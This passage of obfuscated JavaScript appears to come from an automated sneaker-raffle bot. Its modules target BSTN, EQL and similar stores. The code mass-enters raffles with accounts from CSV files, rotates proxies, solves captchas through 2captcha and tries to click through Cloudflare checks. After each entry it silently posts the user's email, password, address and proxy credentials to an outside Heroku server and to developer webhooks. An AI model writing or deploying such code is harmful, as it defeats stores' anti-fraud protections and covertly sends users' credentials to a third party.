                                    const _0x34021b = await _0x259154['$']('#turnstile-wrapper');
                                    if (_0x34021b)
                                        try {
                                            await _0x34021b['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x259154['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x3dee62 = await _0x259154['$']('#turnstile-wrapper');
                                        if (_0x3dee62)
                                            try {
                                                await _0x3dee62['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x259154['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x209448['send']('Browser.setWindowBounds', {
                                    'windowId': _0x3ef71b,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0xb9a1a7(0x1388), await _0x259154['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x259154['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xb9a1a7(0x1f4), console['log'](_0x5b6bc2() + '\x20[' + _0x5e228c['name'] + ']\x20Task\x20' + (_0x15e8c7 + 0x1) + '\x20:\x20Logging\x20in'), await _0x259154['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x356282 => _0x356282['click']()), await _0x259154['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x259154['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xb9a1a7(0x7d0), await _0x259154['waitForSelector']('#email-login'), await _0x259154['type']('#email-login', '' + _0x16b09c[_0x15e8c7]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0xb9a1a7(0xdac), await _0x259154['waitForSelector']('#password'), await _0x259154['type']('#password', '' + _0x16b09c[_0x15e8c7]['Password'], { 'delay': 0xe6 }), await _0xb9a1a7(0x157c);
                                try {
                                    await _0x259154['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x232d04 => _0x232d04['click']());
                                } catch {
                                }
                                try {
                                    await _0x259154['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0x4ed227) {
                                }
                                await _0xb9a1a7(0x3e8);
                                const _0x3fca23 = await _0x259154['$']('.enteredDraw_container__2KmQ_');
                                if (_0x3fca23) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x5b6bc2() + '\x20[' + _0x5e228c['name'] + ']\x20Task\x20' + (_0x15e8c7 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x16b09c[_0x15e8c7]['Size']);
                                try {
                                    if (_0x16b09c[_0x15e8c7]['Size'] != 'RANDOM') {
                                        var _0x59b970 = _0x16b09c[_0x15e8c7]['Size']['replace']('.', ',');
                                        const _0x48235f = await _0x259154['$x']('//div[contains(text(),\x20\x27' + _0x59b970 + '\x27)]');
                                        await _0x48235f[0x0]['click']();
                                    } else {
                                        const _0x2b50b4 = await _0x259154['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x14712f = Math['round'](Math['random']() * (_0x2b50b4['length'] - 0x1));
                                        await _0x2b50b4[_0x14712f]['click']();
                                    }
                                } catch (_0xde00b4) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0xb9a1a7(0x1f4);
                                const _0x19db2e = await _0x259154['$']('.addressList_addressItem__LE2PB');
                                if (_0x19db2e && _0x16b09c[_0x15e8c7]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x5b6bc2() + '\x20[' + _0x5e228c['name'] + ']\x20Task\x20' + (_0x15e8c7 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x259154['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0xb9a1a7(0x5dc), await _0x259154['waitForSelector']('#firstname'), await _0x259154['type']('#firstname', '' + _0x16b09c[_0x15e8c7]['FirstName']), await _0xb9a1a7(0x1f4), await _0x259154['waitForSelector']('#firstname'), await _0x259154['type']('#lastname', '' + _0x16b09c[_0x15e8c7]['LastName']), await _0xb9a1a7(0x1f4), await _0x259154['waitForSelector']('#firstname'), await _0x259154['type']('#street', '' + _0x16b09c[_0x15e8c7]['Address1']), await _0xb9a1a7(0x1f4), await _0x259154['waitForSelector']('#firstname'), await _0x259154['type']('#houseNumber', _0x16b09c[_0x15e8c7]['HouseNumber'] + '\x20' + _0x16b09c[_0x15e8c7]['Address2']), await _0xb9a1a7(0x1f4), await _0x259154['waitForSelector']('#firstname'), await _0x259154['select']('#country_code', '' + _0x16b09c[_0x15e8c7]['Country']), await _0xb9a1a7(0x1f4), await _0x259154['type']('#postcode', '' + _0x16b09c[_0x15e8c7]['Zip']), await _0xb9a1a7(0x1f4), await _0x259154['type']('#city', '' + _0x16b09c[_0x15e8c7]['City']), await _0xb9a1a7(0x1f4), await _0x259154['type']('#telephone', '' + _0x16b09c[_0x15e8c7]['Phone']), await _0xb9a1a7(0x1f4), await _0x259154['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0xb9a1a7(0x9c4);
                                try {
                                    await _0x259154['type']('#instagram_name', '' + _0x16b09c[_0x15e8c7]['Follower']), await _0x259154['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x5b6bc2() + '\x20[' + _0x5e228c['name'] + ']\x20Task\x20' + (_0x15e8c7 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0xb9a1a7(0x5dc);
                                try {
                                    await _0x259154['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0xb9a1a7(0x5dc), await _0x259154['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x26db2a => _0x26db2a['click']()), await _0xb9a1a7(0x1388);
                                try {
                                    await _0x259154['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0x259154['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x16b09c[_0x15e8c7]['Size'] != 'RANDOM') {
                                        var _0x59b970 = _0x16b09c[_0x15e8c7]['Size']['replace']('.', ',');
                                        const _0x1fd479 = await _0x259154['$x']('//div[contains(text(),\x20' + _0x59b970 + ')]');
                                        await _0x1fd479[0x0]['click']();
                                    } else {
                                        const _0x2a4f60 = await _0x259154['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x14712f = Math['round'](Math['random']() * (_0x2a4f60['length'] - 0x1));
                                        await _0x2a4f60[_0x14712f]['click']();
                                    }
                                    await _0xb9a1a7(0x5dc);
                                    try {
                                        await _0x259154['hover']('#instagram_name'), await _0x259154['type']('#instagram_name', '' + _0x16b09c[_0x15e8c7]['Follower']), await _0x259154['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x5b6bc2() + '\x20[' + _0x5e228c['name'] + ']\x20Task\x20' + (_0x15e8c7 + 0x1) + '\x20:\x20Retrying\x20(' + _0x501b6a + '\x20/\x205)');
                                    try {
                                        await _0x259154['hover']('.checkBox_boxHolder__wLGVe'), await _0xb9a1a7(0x5dc), await _0x259154['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0xb9a1a7(0x157c), await _0x259154['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0xfb556c => _0xfb556c['click']()), await _0xb9a1a7(0x1388), await _0x259154['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x2c1d08 = 'no', _0x5207fa(_0x16b09c[_0x15e8c7], _0x5e228c);
                                try {
                                    prxdata = {
                                        'username': _0x1544fc['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x2b8daa),
                                        'proxy': '' + _0x3b8170[_0x15e8c7]
                                    };
                                    var _0x1366cf = JSON['stringify'](prxdata);
                                    let _0x247b64 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x358674['post']('https://jraffles.herokuapp.com/success', _0x1366cf, _0x247b64);
                                } catch (_0x15a906) {
                                }
                                console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x5e228c['name'] + ']\x20Task\x20' + (_0x15e8c7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x85b393 = await _0x530ba6(_0x16b09c[_0x15e8c7], _0x5e228c, 'dev', ![]), _0x4ac01f = await _0x530ba6(_0x16b09c[_0x15e8c7], _0x5e228c, 'pub', ![]);
                                const _0x15124e = {
                                    'succesDEVMSG': { 'embeds': [_0x85b393] },
                                    'succesPUBMSG': { 'embeds': [_0x4ac01f] }
                                };
                                let _0x2b8daa = _0x16b09c[_0x15e8c7];
                                try {
                                    prxdata = {
                                        'username': _0x1544fc['replace']('#', ''),
                                        'module': _0x5e228c['name'],
                                        'entrydata': JSON['stringify'](_0x2b8daa),
                                        'proxy': '' + _0x3b8170[_0x15e8c7]
                                    };
                                    var _0x1366cf = JSON['stringify'](prxdata);
                                    let _0x19e32c = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x358674['post']('https://jraffles.herokuapp.com/success', _0x1366cf, _0x19e32c);
                                } catch (_0x5dff04) {
                                }
                                try {
                                    _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x15124e['succesDEVMSG']), await _0xb9a1a7(0xc8), await _0x313aa7(_0x495189, _0x15124e['succesDEVMSG']), await _0xb9a1a7(0xc8), await _0x313aa7(_0x40302c, _0x15124e['succesPUBMSG']);
                                } catch (_0x375ba0) {
                                    console['log'](_0x5631d3['yellow'](_0x5b6bc2() + '\x20[' + _0x5e228c['name'] + ']\x20Task\x20' + (_0x15e8c7 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x375ba0));
                                }
                            } catch (_0x58912f) {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x5e228c['name'] + ']\x20Task\x20' + (_0x15e8c7 + 0x1) + '\x20:\x20' + _0x58912f)), _0x2c1d08 = 'yes', _0x14579f = '' + _0x58912f;
                                var _0x3a9c93 = await _0x530ba6(_0x16b09c[_0x15e8c7], _0x5e228c, 'dev', !![], _0x14579f), _0x85b393 = await _0x530ba6(_0x16b09c[_0x15e8c7], _0x5e228c, 'dev', ![]), _0x4ac01f = await _0x530ba6(_0x16b09c[_0x15e8c7], _0x5e228c, 'pub', ![]);
                                const _0x3c6002 = {
                                    'succesDEVMSG': { 'embeds': [_0x85b393] },
                                    'succesPUBMSG': { 'embeds': [_0x4ac01f] }
                                };
                                _0x3c6002['errorDEV'] = { 'embeds': [_0x3a9c93] }, _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x3c6002['errorDEV']), await _0x313aa7(_0x4190b7, _0x3c6002['errorDEV']);
                            } finally {
                                _0x3daaf0 && _0x3daaf0['close']();
                                if (_0x2c1d08 == 'yes' && _0x501b6a != 0x5)
                                    return console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x5e228c['name'] + ']\x20Task\x20' + (_0x15e8c7 + 0x1) + '\x20:\x20Retrying\x20(' + _0x501b6a + '\x20/\x205)')), _0x501b6a = _0x501b6a + 0x1, _0x1fcb90--, _0x31db1b(_0x5e228c, _0x16b09c, _0x3b8170, _0x15e8c7, _0x501b6a);
                                _0x2c1d08 == 'yes' && _0x501b6a >= 0x5 && _0x100e1d(_0x16b09c[_0x15e8c7], _0x5e228c), !_0x24598f && (console['log'](_0x5b6bc2() + '\x20[' + _0x5e228c['name'] + ']\x20Waiting\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay'])), _0x1fcb90--;
                            }
                        }
                        _0x31db1b(_0x2bf541, _0x4cabdf, _0x678590, _0x528038, 0x0), await _0xb9a1a7(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x4b9a2a, _0x2580e9) {
                    var _0x737965 = 0x0, _0x26a1e2;
                    try {
                        const _0x325672 = _0xf38118['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x26a1e2 = _0x2587e1['parse'](_0x325672, { 'header': !![] })['data'];
                    } catch (_0x3b151a) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x36e7df = 0x0; _0x36e7df < _0x26a1e2['length']; _0x36e7df++) {
                        maxTasks = Number(_0x4a50c2['threads']);
                        while (_0x737965 >= maxTasks) {
                            await _0xb9a1a7(_0x4a50c2['delay']);
                        }
                        async function _0x50b15e(_0x341ded, _0x3a0a1d, _0xc64f10, _0x58ba8d, _0x1790c3) {
                            _0x737965++, _0x14f2e1['use'](_0x3313a5()), _0x14f2e1['use'](_0x2255ea({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x4a50c2['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x227c2e != 'yes')
                                var _0x227c2e = '', _0x1790c3 = 0x0;
                            var _0x474703;
                            _0x5bbc27(_0x341ded['name'] + '\x20Task\x20' + (_0x58ba8d + 0x1) + '\x20/\x20' + _0xc64f10['length'] + '\x20||\x20File:\x20' + _0x3d6b41 + '\x20Proxies:\x20' + _0x4629ee);
                            var _0x3aad19 = await _0x530ba6(_0xc64f10[_0x58ba8d], _0x341ded, 'acc', ![]);
                            const _0x2a4c19 = { 'succesDEVMSG': { 'embeds': [_0x3aad19] } }, _0x18e3cf = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x2f6236 = Math['round'](Math['random']() * (_0x3a0a1d['length'] - 0x1)), _0x5e48e2 = _0x3a0a1d[_0x2f6236]['split'](':'), _0x47e240;
                            try {
                                _0x47e240 = await _0x14f2e1['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x5e48e2[0x0] + ':' + _0x5e48e2[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x47e240 = await _0x14f2e1['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x5e48e2[0x0] + ':' + _0x5e48e2[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0x5b6bc2() + '\x20[' + _0x341ded['name'] + ']\x20Task\x20' + (_0x58ba8d + 0x1) + '\x20:\x20Checking\x20' + _0xc64f10[_0x58ba8d]['Email']);
                                const _0x524f7e = await _0x47e240['newPage']();
                                await _0x524f7e['authenticate']({
                                    'username': '' + _0x5e48e2[0x2],
                                    'password': '' + _0x5e48e2[0x3]
                                }), console['log'](_0x5b6bc2() + '\x20[' + _0x341ded['name'] + ']\x20Task\x20' + (_0x58ba8d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x524f7e['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x524f7e['setRequestInterception'](!![]), _0x524f7e['on']('request', _0x430d43 => {
                                    _0x430d43['resourceType']() === 'image' ? _0x430d43['abort']() : _0x430d43['continue']();
                                });
                                try {
                                    await _0x524f7e['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x524f7e['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x227c2e = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0x524f7e['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x5b6bc2() + '\x20[' + _0x341ded['name'] + ']\x20Task\x20' + (_0x58ba8d + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0xb9a1a7(0x3e8), await _0x524f7e['type']('#email', _0xc64f10[_0x58ba8d]['Email']), await _0xb9a1a7(0x1f4), await _0x524f7e['type']('#pass', _0xc64f10[_0x58ba8d]['Password']), await _0xb9a1a7(0x1f4), await _0x524f7e['$eval']('#login-form', _0x221d17 => _0x221d17['submit']());
                                try {
                                    await _0x524f7e['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0x5b6bc2() + '\x20[' + _0x341ded['name'] + ']\x20Task\x20' + (_0x58ba8d + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0xb9a1a7(0x190);
                                const _0x20de61 = await _0x524f7e['evaluate'](() => {
                                    const _0x2f8536 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x2f8536['map'](_0x38e7f4 => _0x38e7f4['alt']);
                                }), _0xe5a96b = await _0x524f7e['evaluate'](() => {
                                    const _0x125e44 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x125e44['map'](_0x11c9a1 => _0x11c9a1['innerHTML']);
                                }), _0x5f16b8 = await _0x524f7e['$$']('.raffle-winner');
                                if (_0x5f16b8['length'] < 0x1) {
                                    console['log'](_0x5b6bc2() + '\x20[' + _0x341ded['name'] + ']\x20Task\x20' + (_0x58ba8d + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x227c2e = 'no';
                                    return;
                                }
                                console['log'](_0x5b6bc2() + '\x20[' + _0x341ded['name'] + ']\x20Task\x20' + (_0x58ba8d + 0x1) + '\x20:\x20' + _0x5f16b8['length'] + '\x20Wins\x20Found!');
                                for (var _0x70cc8e = 0x0; _0x70cc8e < _0x5f16b8['length']; _0x70cc8e++) {
                                    console['log'](_0x5631d3['green'](_0x20de61[_0x70cc8e] + _0xe5a96b[_0x70cc8e]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0x1b5b53) {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x341ded['name'] + ']\x20Task\x20' + (_0x58ba8d + 0x1) + '\x20:\x20' + _0x1b5b53)), _0x474703 = '' + _0x1b5b53;
                                var _0x40349a = await _0x530ba6(_0xc64f10[_0x58ba8d], _0x341ded, 'acc', !![], _0x474703);
                                _0x2a4c19['errorDEV'] = { 'embeds': [_0x40349a] }, _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x2a4c19['errorDEV']), await _0x313aa7(_0x4190b7, _0x2a4c19['errorDEV']), _0x227c2e = 'yes';
                            } finally {
                                if (_0x47e240)
                                    _0x47e240['close']();
                                if (_0x227c2e == 'yes' && _0x1790c3 != 0x5)
                                    return console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x341ded['name'] + ']\x20Task\x20' + (_0x58ba8d + 0x1) + '\x20:\x20Retrying\x20(' + _0x1790c3 + '\x20/\x205)')), _0x737965--, _0x1790c3 = _0x1790c3 + 0x1, _0x50b15e(_0x341ded, _0x3a0a1d, _0xc64f10, _0x58ba8d, _0x1790c3);
                                _0x227c2e == 'yes' && _0x1790c3 >= 0x5 && (_0x100e1d(_0xc64f10[_0x58ba8d], _0x341ded), _0x227c2e = 'no', _0x1790c3 = 0x0), console['log'](_0x5b6bc2() + '\x20[' + _0x341ded['name'] + ']\x20Waiting\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay']), _0x737965--;
                            }
                        }
                        _0x50b15e(_0x4b9a2a, _0x2580e9, _0x26a1e2, _0x36e7df, 0x0), await _0xb9a1a7(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x20965b, _0x5e87ec, _0x4652b4) {
                _0x14f2e1['use'](_0x3313a5()), _0x14f2e1['use'](_0x2255ea({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4a50c2['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x147e30 = 0x0; _0x147e30 < _0x5e87ec['length']; _0x147e30++) {
                    var _0x1b0fb0;
                    _0x5bbc27(_0x20965b['name'] + '\x20Task\x20' + (_0x147e30 + 0x1) + '\x20/\x20' + _0x5e87ec['length'] + '\x20||\x20File:\x20' + _0x3d6b41 + '\x20Proxies:\x20' + _0x4629ee);
                    try {
                        await _0x2dc03a(_0x5e87ec, _0x147e30);
                    } catch {
                        _0x204dbe = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0xafdd99(_0x2d6859) {
                        const _0x24ea94 = _0xf38118['readFileSync']('../successful-tasks.csv', 'utf8'), _0x53346b = _0x2587e1['parse'](_0x24ea94, { 'header': !![] })['data'];
                        let _0x4dc094 = ![];
                        for (var _0x528178 of _0x53346b) {
                            if (_0x528178['Url'] == _0x2d6859['Url'] && _0x528178['Email'] == _0x2d6859['Email']) {
                                _0x4dc094 = !![];
                                break;
                            }
                        }
                        return _0x4dc094;
                    }
                    if (await _0xafdd99(_0x5e87ec[_0x147e30]) == !![]) {
                        console['log'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x3d6e73 = ![];
                    const _0x2b1e1d = _0xf38118['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x554cce = _0x2587e1['parse'](_0x2b1e1d, { 'header': !![] })['data'];
                    for (var _0x276c22 of _0x554cce) {
                        _0x276c22['Email'] == _0x5e87ec[_0x147e30]['Email'] && (_0x3d6e73 = !![]);
                    }
                    if (_0x3d6e73 == ![]) {
                        var _0x2ee504;
                        if (_0x5e87ec[_0x147e30]['Url']['endsWith']('/')) {
                            _0x2ee504 = _0x5e87ec[_0x147e30]['Url'] + 'register';
                            if (_0x204dbe != 'yes')
                                var _0x204dbe = '', _0x181e1a = 0x0;
                        } else {
                            _0x2ee504 = _0x5e87ec[_0x147e30]['Url'] + '/register';
                            if (_0x204dbe != 'yes')
                                var _0x204dbe = '', _0x181e1a = 0x0;
                        }
                        if (_0x5e87ec[_0x147e30]['Email'] == '' || _0x5e87ec[_0x147e30]['FirstName'] == '' || _0x5e87ec[_0x147e30]['LastName'] == '') {
                            console['log'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x5e87ec[_0x147e30]['Password'] == '' && (_0x5e87ec[_0x147e30]['Password'] = 'JRaffles23!');
                        if (_0x4a50c2['useRandomProxy'] = ![])
                            var _0x4e5fd7 = _0x4652b4[_0x147e30]['split'](':');
                        else
                            var _0x32dd84 = Math['round'](Math['random']() * (_0x4652b4['length'] - 0x1)), _0x4e5fd7 = _0x4652b4[_0x32dd84]['split'](':');
                        var _0x3a661b;
                        try {
                            _0x3a661b = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4e5fd7[0x0] + ':' + _0x4e5fd7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3a661b = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4e5fd7[0x0] + ':' + _0x4e5fd7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3f4749 = await _0x3a661b['newPage']();
                            await _0x3f4749['authenticate']({
                                'username': '' + _0x4e5fd7[0x2],
                                'password': '' + _0x4e5fd7[0x3]
                            }), console['log'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3f4749['setRequestInterception'](!![]), _0x3f4749['on']('request', _0x25db9e => {
                                _0x25db9e['resourceType']() === 'image' || _0x25db9e['resourceType']() === 'font' || _0x25db9e['resourceType']() === 'media' ? _0x25db9e['abort']() : _0x25db9e['continue']();
                            });
                            try {
                                await _0x3f4749['goto']('' + _0x2ee504);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xb9a1a7(0x3e8), await _0x3f4749['waitForSelector']('#email');
                            try {
                                try {
                                    await _0x3f4749['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0xb9a1a7(0x3e8), _0x5e87ec[_0x147e30]['Url']['includes']('en-GB') ? await _0x3f4749['click']('li[data-value=\x22UK\x20' + _0x5e87ec[_0x147e30]['Size'] + '\x20/\x20US\x20' + (Number(_0x5e87ec[_0x147e30]['Size']) + 0x1) + '\x22]') : await _0x3f4749['click']('li[data-value=\x22EU\x20' + _0x5e87ec[_0x147e30]['Size'] + '\x22]');
                                } catch {
                                    await _0x3f4749['click']('#productQuantity'), await _0xb9a1a7(0x3e8), await _0x3f4749['click']('li[data-value=\x22' + (Number(_0x5e87ec[_0x147e30]['Size']) - 0x1) + '\x22]');
                                }
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x5e87ec[_0x147e30]['Size']);
                            }
                            await _0xb9a1a7(0x6a4);
                            try {
                                await _0x3f4749['select']('.PhoneInputCountrySelect', _0x5e87ec[_0x147e30]['Country']);
                            } catch {
                            }
                            await _0x3f4749['type']('#email', '' + _0x5e87ec[_0x147e30]['Email']), await _0xb9a1a7(0x352), await _0x3f4749['waitForSelector']('#password'), await _0x3f4749['type']('#password', '' + _0x5e87ec[_0x147e30]['Password']), await _0xb9a1a7(0x352), await _0x3f4749['type']('#phone', '' + _0x5e87ec[_0x147e30]['Phone']), await _0xb9a1a7(0x352);
                            const _0x2a4cce = await _0x3f4749['$']('#title\x20>\x20label');
                            await _0xb9a1a7(0x12c);
                            _0x2a4cce && await _0x2a4cce['click']();
                            await _0x3f4749['type']('#firstName', '' + _0x5e87ec[_0x147e30]['FirstName']), await _0xb9a1a7(0x352), await _0x3f4749['type']('#lastName', '' + _0x5e87ec[_0x147e30]['LastName']), await _0xb9a1a7(0x352);
                            _0x5e87ec[_0x147e30]['Url']['includes']('footlocker.de') ? await _0x3f4749['type']('#birthdate', _0x5c4736(0xa, 0x1c) + '.' + _0x5c4736(0xa, 0xc) + '.' + _0x5c4736(0x7c6, 0x7d3)) : await _0x3f4749['type']('#birthdate', _0x5c4736(0xa, 0x1c) + '-' + _0x5c4736(0xa, 0xc) + '-' + _0x5c4736(0x7c6, 0x7d3));
                            await _0xb9a1a7(0x352), await _0x3f4749['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x5e87ec[_0x147e30]['Url']['includes']('en-GB') && await _0x3f4749['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0xb9a1a7(0x1f4), await _0xb9a1a7(0x5dc);
                            if (!_0x2ee504['includes']('footlocker'))
                                try {
                                    await _0x3f4749['click']('#country');
                                    const _0x17ec1b = await _0x3f4749['$']('li[data-value=\x22' + _0x5e87ec[_0x147e30]['Country'] + '\x22]');
                                    await _0x17ec1b['click'](), await _0x17ec1b['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0xb9a1a7(0x3e8);
                            if (!_0x5e87ec[_0x147e30]['Url']['includes']('en-GB')) {
                                await _0x3f4749['click']('#stateAutocomplete'), await _0xb9a1a7(0x5dc);
                                try {
                                    const _0x4b4146 = await _0x3f4749['$x']('//li[text()=\x22' + _0x5e87ec[_0x147e30]['State'] + '\x22]');
                                    await _0x4b4146[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x5b6bc2() + '\x20[' + _0x20965b['name'] + ']\x20Task\x20' + (_0x147e30 + 0x1) + '\x20:\x20Setting\x20Address'), await _0xb9a1a7(0x3e8), await _0xb9a1a7(0x1f4);
                            if (_0x5e87ec[_0x147e30]['Url']['includes']('topps')) {
                                await _0x3f4749['click']('#stateAutocomplete'), await _0xb9a1a7(0x5dc);
                                try {
